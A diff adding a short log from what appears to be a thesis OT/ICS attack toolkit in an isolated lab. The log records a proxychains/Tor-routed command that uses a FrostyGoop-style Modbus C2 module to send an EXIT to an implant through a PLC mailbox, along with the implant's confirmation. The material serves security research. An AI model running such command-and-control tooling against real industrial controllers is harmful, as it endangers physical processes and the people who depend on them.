@@ -1,0 +1,25 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  C2 Modbus (FrostyGoop) — Finalización del implante
+======================================================================
+  Fecha      : 2026-10-13 16:47:33
+  Objetivo   : mailbox=192.168.10.11:502
+  MITRE ICS  : T0869, T0807
+======================================================================
+$ proxychains python3 -m modules._cli.c2_modbus_cli exit_implant --mailbox 192.168.10.11 --mailbox-port 502
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+
+────────────────────────────────────────────────────────────
+[C2] Enviando EXIT al implante...
+────────────────────────────────────────────────────────────
+[*] Conectando a PLC-buzón 192.168.10.11:502 (UID=2)...
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.11:502  ...  OK
+[+] Comando enviado: opcode=exit, seq=24742, payload=0B (0 regs)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.11:502  ...  OK
+[*] Esperando respuesta (seq=24742, timeout=30s, poll=3s)...
+[+] Respuesta recibida: status=OK, payload=18B
+[+] Salida:
+    implante terminado
+[=] Código de salida: 0
